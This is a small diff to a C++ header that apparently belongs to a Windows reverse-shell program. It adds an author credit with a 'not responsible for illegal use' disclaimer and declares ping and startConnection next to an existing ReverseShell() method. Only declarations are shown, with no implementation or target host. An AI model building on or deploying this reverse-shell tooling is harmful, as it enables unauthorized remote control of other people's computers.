@@ -1,3 +1,8 @@
+/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
 #pragma once
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
@@ -21,5 +26,7 @@ private:
 protected:
 public:
 	static void readFromSocket(SOCKET& sock);
+	void ping(SOCKET& sock);
 	INT ReverseShell();
+	void startConnection();
 };
